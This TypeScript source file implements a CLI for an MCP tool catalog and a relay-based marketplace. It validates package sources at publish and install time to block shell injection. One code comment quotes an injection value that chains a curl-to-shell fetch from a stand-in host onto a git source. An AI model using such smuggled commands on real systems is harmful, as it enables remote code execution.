/** fez tool — the machine's MCP catalog and the decentralized marketplace. `fez skill` is a hidden alias kept for one release. */
import type { Command } from "commander";
import chalk from "chalk";
import { CapabilityClient } from "../protocol/client.js";

/**
 * A listing's `source` is authored by WHOEVER published it — any pubkey,
 * not just us — and `PackageManager.install()`'s git branch shells out
 * (`execSync(`git clone ${url} …`)`). Anchored, no-metacharacter
 * patterns only: `git:github.com/o/r; curl evil.sh|sh #` must never
 * reach that execSync. Checked at BOTH ends — publish (so our own CLI
 * won't sign a bad listing) and install (so a listing from anywhere
 * else still can't).
 */
const SAFE_NPM_SOURCE = /^npm:@?[a-zA-Z0-9._/-]+$/;
const SAFE_GIT_SOURCE = /^git:github\.com\/[\w.-]+\/[\w.-]+$/;

export function safePackageSource(source: string | undefined): source is string {
  return !!source && (SAFE_NPM_SOURCE.test(source) || SAFE_GIT_SOURCE.test(source));
}

/** What `tool install` actually does with a resolved listing — decided once, tested without a relay. */
export type InstallAction =
  | { kind: "mcp"; config: { type?: string; url?: string; command?: string; args?: string[] } }
  | { kind: "package"; source: string }
  | { kind: "print"; installCmd: string }
  | { kind: "reject"; reason: string };

/**
 * `mcp` writes settings.mcpServers — the only artifact kind that does.
 * `skill` is a published package (SKILL.md + its support files), so it
 * routes to the SAME install path `fez install <source>` uses — never an
 * mcpServers write. Everything else (extension, pi-package) still just
 * prints its installCmd, unchanged from before `skill` existed.
 */
export function resolveInstallAction(listing: {
  artifact?: string;
  command?: string;
  args?: string[];
  url?: string;
  installCmd?: string;
  source?: string;
  npm?: string;
}): InstallAction {
  const artifact = listing.artifact ?? "mcp";
  if (artifact === "mcp") {
    return {
      kind: "mcp",
      config: listing.url ? { type: "http", url: listing.url } : { command: listing.command, args: listing.args },
    };
  }
  if (artifact === "skill") {
    const source = listing.source ?? (listing.npm ? `npm:${listing.npm}` : "");
    if (!safePackageSource(source)) {
      return { kind: "reject", reason: `refuses to install "${source}" — not a recognized package source (expected npm:<pkg> or git:github.com/<owner>/<repo>)` };
    }
    return { kind: "package", source };
  }
  return { kind: "print", installCmd: listing.installCmd ?? (listing.npm ? `fez install npm:${listing.npm}` : "") };
}

/** The listing JSON `tool publish` signs and sends — pure, so the shape is testable without a relay. */
export function buildListing(
  name: string,
  artifact: string,
  config: { command?: string; args?: string[]; url?: string; env?: Record<string, string> } | undefined,
  options: { description?: string; homepage?: string; github?: string; npm?: string; source?: string }
): Record<string, unknown> {
  const envKeys = Object.keys(config?.env ?? {});
  const installCmd =
    artifact === "skill"
      ? `fez install ${options.source}`
      : artifact === "extension"
        ? `fez install npm:${options.npm}`
        : artifact === "pi-package"
          ? `add to the persona frontmatter: packages: [npm:${options.npm}]`
          : `fez tool install ${name}${envKeys.length ? " " + envKeys.map((key) => `--env ${key}=<value>`).join(" ") : ""}`;
  return {
    name,
    artifact,
    description: options.description ?? "",
    ...(artifact === "mcp"
      ? config!.url
        ? { type: "http", url: config!.url }
        : { command: config!.command, args: config!.args ?? [] }
      : {}),
    envKeys, // names only — values stay home
    installCmd,
    ...(artifact === "skill" && options.source ? { source: options.source } : {}),
    ...(options.homepage ? { homepage: options.homepage } : {}),
    ...(options.github ? { github: options.github } : {}),
    ...(options.npm ? { npm: options.npm } : {}),
  };
}

export function registerSkillCommands(program: Command): void {
// ─── tool — the machine's MCP catalog + the decentralized marketplace ───────

// Attached identically to the visible `tool` command and the hidden
// `skill` alias below — same subcommands, same behavior, so the old
// spelling keeps working for one release without duplicating logic.
function attachToolCommands(tool: Command): void {

tool
  .command("add <name>")
  .description("Define a tool: what the name means on THIS machine (personas reference it via mcpServers:)")
  .option("--from <spec>", "source spec — npm:<pkg>, uvx:<pkg>, pipx:<pkg> or an https:// url")
  .option("--command <cmd>", "executable to launch (stdio MCP server)")
  .option("--args <list>", "comma-separated arguments")
  .option("--url <url>", "HTTP MCP server URL instead of a command")
  .option("--env <pairs...>", "KEY=value pairs (stored locally, never published)")
  .action(async (name: string, options) => {
    const { loadSettings, saveSettings } = await import("../shared/settings.js");
    const { parseSkillSource, describeSkillSpec, SOURCE_SCHEMES } = await import("../extensions/skill-source.js");
    // --from is the shorthand a persona's `name=spec` declares; it
    // expands to exactly the same command/args a hand-written --command
    // would, and we echo that expansion so nothing installs unseen.
    const fromSpec = options.from ? parseSkillSource(options.from as string) : undefined;
    if (options.from && !fromSpec) {
      console.error(`Can't resolve "${options.from}" — expected one of: ${SOURCE_SCHEMES.join(", ")}`);
      process.exitCode = 1;
      return;
    }
    if (!fromSpec && !options.command && !options.url) {
      console.error("A tool needs --from (a published package), --command (stdio) or --url (http).");
      process.exitCode = 1;
      return;
    }
    const env: Record<string, string> = {};
    for (const pair of (options.env as string[] | undefined) ?? []) {
      const eq = pair.indexOf("=");
      if (eq > 0) env[pair.slice(0, eq)] = pair.slice(eq + 1);
    }
    const config: Record<string, unknown> = fromSpec
      ? { ...fromSpec, ...(Object.keys(env).length ? { env } : {}) }
      : options.url
      ? { type: "http", url: options.url }
      : {
          command: options.command,
          ...(options.args ? { args: (options.args as string).split(",").map((a: string) => a.trim()) } : {}),
          ...(Object.keys(env).length ? { env } : {}),
        };
    if (fromSpec) console.log(`   runs: ${chalk.dim(describeSkillSpec(fromSpec))}`);
    const settings = loadSettings() as { mcpServers?: Record<string, unknown> };
    saveSettings({ mcpServers: { ...settings.mcpServers, [name]: config } } as never);
    console.log(`✅ tool "${name}" defined — personas declaring mcpServers: [${name}] get it on next spawn.`);
  });

tool
  .command("list")
  .description("List defined tools and which personas declare them")
  .action(async () => {
    const { loadSettings } = await import("../shared/settings.js");
    const { listPersonas } = await import("../identity/personas.js");
    const settings = loadSettings() as { mcpServers?: Record<string, { command?: string; url?: string; env?: Record<string, string> }> };
    const skills = settings.mcpServers ?? {};
    const personas = await listPersonas();
    if (Object.keys(skills).length === 0) {
      console.log("No tools defined — fez tool add <name> --command ... (or install one from the marketplace: fez tool market)");
    }
    for (const [name, config] of Object.entries(skills)) {
      const users = personas.filter((persona) => persona.mcpServers.includes(name)).map((persona) => `@${persona.id}`);
      const what = config.url ?? [config.command].join(" ");
      console.log(`  ${chalk.green(name.padEnd(18))} ${what}${config.env ? chalk.dim(` (env: ${Object.keys(config.env).join(", ")})`) : ""}${users.length ? chalk.cyan(`  ← ${users.join(", ")}`) : ""}`);
    }
    // Declared-but-undefined is the actionable gap, so print the fix
    // rather than only the complaint — a persona that declared a source
    // has already answered "which package?", which is the hard part.
    const { installHint, wellKnownSource } = await import("../extensions/skill-source.js");
    const declaredSource = new Map<string, string>();
    for (const persona of personas) {
      for (const [name, source] of Object.entries(persona.mcpSources ?? {})) declaredSource.set(name, source);
    }
    const declared = new Set<string>(personas.flatMap((persona) => persona.mcpServers));
    const undefinedSkills = [...declared].filter((name) => !skills[name]);
    if (undefinedSkills.length > 0) {
      console.log(chalk.yellow(`  ⚠ declared but undefined — agents disclose the gap until you define them:`));
      for (const name of undefinedSkills) {
        console.log(chalk.yellow(`    ${installHint(name, declaredSource.get(name) ?? wellKnownSource(name))}`));
      }
    }
  });

tool
  .command("remove <name>")
  .description("Remove a tool definition (personas declaring it fall back to disclosure)")
  .action(async (name: string) => {
    const { loadSettings, saveSettings } = await import("../shared/settings.js");
    const settings = loadSettings() as { mcpServers?: Record<string, unknown> };
    if (!settings.mcpServers?.[name]) return console.log(`No tool named "${name}".`);
    const { [name]: _removed, ...rest } = settings.mcpServers;
    saveSettings({ mcpServers: rest } as never);
    console.log(`🗑  tool "${name}" removed.`);
  });

tool
  .command("publish <name>")
  .description("Publish a marketplace listing (env VALUES never leave this machine)")
  .option("-r, --relay <url>", "Relay URL (default: settings/env)")
  .option("--description <text>", "what this tool does")
  .option("--homepage <url>", "docs link")
  .option("--github <url>", "source repository")
  .option("--npm <name>", "npm package name")
  .option("--artifact <type>", "mcp (default) | extension (fez install) | pi-package (persona packages:) | skill (fez install)")
  .option("--source <spec>", "package source for --artifact skill: npm:<pkg> or git:github.com/o/r")
  .action(async (name: string, options) => {
    const { loadSettings, resolveRelays } = await import("../shared/settings.js");
    const { loadOrCreateKey } = await import("../identity/keys.js");
    const { KIND_SKILL_LISTING } = await import("../protocol/kinds.js");
    const settings = loadSettings() as { mcpServers?: Record<string, { command?: string; args?: string[]; url?: string; type?: string; env?: Record<string, string> }> };
    const artifact = (options.artifact as string | undefined) ?? "mcp";
    const config = settings.mcpServers?.[name];
    if (artifact === "mcp" && !config) {
      console.error(`No tool named "${name}" — define it first: fez tool add ${name} ...`);
      process.exitCode = 1;
      return;
    }
    if (artifact === "skill" && !safePackageSource(options.source)) {
      console.error(`--artifact skill needs --source npm:<pkg> or --source git:github.com/o/r (that's what gets installed).`);
      process.exitCode = 1;
      return;
    }
    if (artifact !== "mcp" && artifact !== "skill" && !options.npm) {
      console.error(`--artifact ${artifact} needs --npm <package> (that's what gets installed).`);
      process.exitCode = 1;
      return;
    }
    // A listing carries a POINTER, never bytes — so it has to point at
    // something the installer can reach. A path on this disk fails
    // silently on theirs: the MCP server won't start, and a server that
    // won't start is indistinguishable from a tool nobody declared.
    const { machineLocalPath } = await import("../extensions/skill-source.js");
    const localPath = artifact === "mcp" ? machineLocalPath(config) : undefined;
    if (localPath) {
      console.error(
        `Can't publish "${name}" — its command points at ${localPath}, which exists only on this machine.\n` +
          `Anyone installing it would get that path verbatim and their agents would spawn against nothing.\n` +
          `Publish the package first, then define the tool from it: fez tool add ${name} --from npm:<package>`
      );
      process.exitCode = 1;
      return;
    }
    const { RelayConnection } = await import("../protocol/relay.js");
    const client = new CapabilityClient({ relay: resolveRelays(options.relay), privateKey: loadOrCreateKey("default") });
    const relay = new RelayConnection({ urls: resolveRelays(options.relay), authSigner: client.authSigner });
    await relay.connect();
    const listing = buildListing(name, artifact, config, options);
    await relay.publish(client.signEvent({ kind: KIND_SKILL_LISTING, tags: [["d", name]], content: JSON.stringify(listing) }));
    console.log(`📡 published "${name}" to the marketplace (signed by your key; env values NOT included).`);
    relay.disconnect();
  });

tool
  .command("install <name>")
  .description("Install a tool from a marketplace listing (writes your catalog + publishes an install receipt)")
  .option("-r, --relay <url>", "Relay URL (default: settings/env)")
  .option("--from <pubkey>", "listing author (default: most-installed listing of that name)")
  .option("--env <pairs...>", "KEY=value for each env key the listing requires (stored locally)")
  .option("-y, --yes", "skip the confirmation prompt (for scripts/CI)")
  .action(async (name: string, options) => {
    const { loadSettings, saveSettings, resolveRelays } = await import("../shared/settings.js");
    const { loadOrCreateKey } = await import("../identity/keys.js");
    const { KIND_SKILL_LISTING, KIND_SKILL_INSTALL } = await import("../protocol/kinds.js");
    const { RelayConnection } = await import("../protocol/relay.js");
    const client = new CapabilityClient({ relay: resolveRelays(options.relay), privateKey: loadOrCreateKey("default") });
    const relay = new RelayConnection({ urls: resolveRelays(options.relay), authSigner: client.authSigner });
    await relay.connect();
    const events = (await relay.query([{ kinds: [KIND_SKILL_LISTING], "#d": [name], limit: 50 }])) as { pubkey: string; content: string; created_at: number }[];
    const candidates = events
      .filter((e) => !options.from || e.pubkey === options.from)
      .sort((a, b) => b.created_at - a.created_at);
    const event = candidates[0];
    if (!event) {
      console.error(`No listing named "${name}" on this relay${options.from ? ` by ${options.from.slice(0, 12)}` : ""}.`);
      relay.disconnect();
      process.exitCode = 1;
      return;
    }
    const listing = JSON.parse(event.content) as { artifact?: string; command?: string; args?: string[]; url?: string; type?: string; envKeys?: string[]; installCmd?: string; npm?: string; source?: string };
    const action = resolveInstallAction(listing);

    // Best-effort: the receipt is already on the wire; the index just
    // makes the install count universal across relays.
    const publishInstallReceipt = async () => {
      const receipt = client.signEvent({ kind: KIND_SKILL_INSTALL, tags: [["skill", name], ["p", event.pubkey]], content: "" });
      await relay.publish(receipt);
      const { resolveSkillCountsUrl } = await import("../shared/settings.js");
      const countsUrl = resolveSkillCountsUrl();
      if (countsUrl) {
        await fetch(countsUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(receipt),
          signal: AbortSignal.timeout(5000),
        }).catch(() => console.log(chalk.dim("   (global counter unreachable — receipt is on the relay regardless)")));
      }
    };

    if (action.kind === "print") {
      console.log(`"${name}" is a ${listing.artifact} — install it with:\n  ${action.installCmd}`);
      relay.disconnect();
      return;
    }

    if (action.kind === "reject") {
      console.error(`${action.reason} — listed by ${event.pubkey.slice(0, 12)}`);
      relay.disconnect();
      process.exitCode = 1;
      return;
    }

    if (action.kind === "package") {
      // Same install path `fez install <source>` uses — a skill is a
      // published package, never an mcpServers write. It's still code
      // fetched and run on relay-authored say-so, so it gets the same
      // gate a stranger's command deserves: shown, then confirmed.
      console.log(`This will fetch and install a package on your machine:\n  ${chalk.yellow(action.source)}\n  (listed by ${event.pubkey.slice(0, 12)})`);
      if (!options.yes) {
        const readline = await import("node:readline/promises");
        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
        const answer = (await rl.question("Install? (y/N) ")).trim().toLowerCase();
        rl.close();
        if (answer !== "y" && answer !== "yes") {
          console.log("Aborted — nothing installed.");
          relay.disconnect();
          return;
        }
      }
      const { PackageManager } = await import("../extensions/package-manager.js");
      const pm = new PackageManager();
      await pm.init();
      await pm.install(action.source);
      await publishInstallReceipt();
      console.log(`✅ installed "${name}" (+1 on its install count).`);
      relay.disconnect();
      return;
    }

    // action.kind === "mcp"
    const env: Record<string, string> = {};
    for (const pair of (options.env as string[] | undefined) ?? []) {
      const eq = pair.indexOf("=");
      if (eq > 0) env[pair.slice(0, eq)] = pair.slice(eq + 1);
    }
    const missing = (listing.envKeys ?? []).filter((key) => !env[key]);
    if (missing.length > 0) {
      console.error(`Listing requires env values: ${missing.map((k) => `--env ${k}=<value>`).join(" ")}`);
      relay.disconnect();
      process.exitCode = 1;
      return;
    }
    const what = action.config.url ?? [action.config.command, ...(action.config.args ?? [])].join(" ");
    console.log(`This will run on your machine when declaring agents spawn:\n  ${chalk.yellow(what)}\n  (listed by ${event.pubkey.slice(0, 12)})`);
    const config = action.config.url
      ? { type: "http", url: action.config.url }
      : { command: action.config.command, ...(action.config.args?.length ? { args: action.config.args } : {}), ...(Object.keys(env).length ? { env } : {}) };
    const settings = loadSettings() as { mcpServers?: Record<string, unknown> };
    saveSettings({ mcpServers: { ...settings.mcpServers, [name]: config } } as never);
    await publishInstallReceipt();
    console.log(`✅ installed "${name}" (+1 on its install count) — declare mcpServers: [${name}] in a persona to use it.`);
    relay.disconnect();
  });

tool
  .command("market")
  .description("Browse marketplace listings on the relay")
  .option("-r, --relay <url>", "Relay URL (default: settings/env)")
  .action(async (options) => {
    const { resolveRelays } = await import("../shared/settings.js");
    const { loadOrCreateKey } = await import("../identity/keys.js");
    const { KIND_SKILL_LISTING } = await import("../protocol/kinds.js");
    const { RelayConnection } = await import("../protocol/relay.js");
    const client = new CapabilityClient({ relay: resolveRelays(options.relay), privateKey: loadOrCreateKey("default") });
    const relay = new RelayConnection({ urls: resolveRelays(options.relay), authSigner: client.authSigner });
    await relay.connect();
    const { KIND_SKILL_INSTALL } = await import("../protocol/kinds.js");
    const events = (await relay.query([{ kinds: [KIND_SKILL_LISTING], limit: 100 }])) as { pubkey: string; content: string; created_at: number; tags: string[][] }[];
    const receipts = (await relay.query([{ kinds: [KIND_SKILL_INSTALL], limit: 500 }])) as { pubkey: string; tags: string[][] }[];
    const installCounts = new Map<string, Set<string>>();
    for (const receipt of receipts) {
      const skillName = receipt.tags.find((t) => t[0] === "skill")?.[1];
      const author = receipt.tags.find((t) => t[0] === "p")?.[1];
      if (!skillName || !author) continue;
      const key = `${author}:${skillName}`;
      if (!installCounts.has(key)) installCounts.set(key, new Set());
      installCounts.get(key)!.add(receipt.pubkey);
    }
    // Global counts (cross-relay index) override this relay's local view.
    const globalCounts = new Map<string, number>();
    const { resolveSkillCountsUrl } = await import("../shared/settings.js");
    const countsUrl = resolveSkillCountsUrl();
    if (countsUrl) {
      try {
        const res = await fetch(countsUrl, { signal: AbortSignal.timeout(5000) });
        const body = (await res.json()) as { counts?: { skill_name: string; listing_author: string; installs: number }[] };
        for (const row of body.counts ?? []) globalCounts.set(`${row.listing_author}:${row.skill_name}`, row.installs);
      } catch { /* index unreachable — relay-local counts stand */ }
    }
    const latest = new Map<string, { pubkey: string; content: string; created_at: number }>();
    for (const event of events) {
      const d = event.tags.find((t: string[]) => t[0] === "d")?.[1] ?? "";
      const prior = latest.get(`${event.pubkey}:${d}`);
      if (!prior || event.created_at > prior.created_at) latest.set(`${event.pubkey}:${d}`, event);
    }
    if (latest.size === 0) console.log("No listings on this relay yet — fez tool publish <name> puts yours up.");
    for (const event of latest.values()) {
      try {
        const listing = JSON.parse(event.content) as { name: string; artifact?: string; description?: string; command?: string; args?: string[]; url?: string; envKeys?: string[]; installCmd?: string; github?: string; npm?: string };
        const key = `${event.pubkey}:${listing.name}`;
        const installs = globalCounts.get(key) ?? installCounts.get(key)?.size ?? 0;
        const what = listing.url ?? [listing.command, ...(listing.args ?? [])].filter(Boolean).join(" ");
        console.log(`  ${chalk.green(listing.name.padEnd(18))} ${chalk.dim(`[${listing.artifact ?? "mcp"}]`)} ${listing.description ?? ""}  ${chalk.cyan(`${installs} install${installs === 1 ? "" : "s"}`)}`);
        if (what) console.log(chalk.dim(`    runs: ${what}${listing.envKeys?.length ? `  needs env: ${listing.envKeys.join(", ")}` : ""}`));
        if (listing.installCmd) console.log(chalk.yellow(`    install: ${listing.installCmd}`));
        const links = [listing.github, listing.npm ? `npm:${listing.npm}` : undefined].filter(Boolean).join("  ");
        console.log(chalk.dim(`    ${links ? links + "  " : ""}by ${event.pubkey.slice(0, 12)}`));
      } catch { /* skip malformed */ }
    }
    console.log(chalk.dim(`\n  READ the command before installing — it runs on your machine.`));
    relay.disconnect();
  });

}

const tool = program.command("tool").description("Tools (MCP servers) personas can declare — plus publishing to the marketplace");
attachToolCommands(tool);

// `fez skill` — hidden alias for one release. A real second registration
// (not commander's .alias(), which prints "tool|skill" in top-level
// help) so it stays fully out of `fez --help` while still routing.
const skill = program.command("skill", { hidden: true });
attachToolCommands(skill);
}
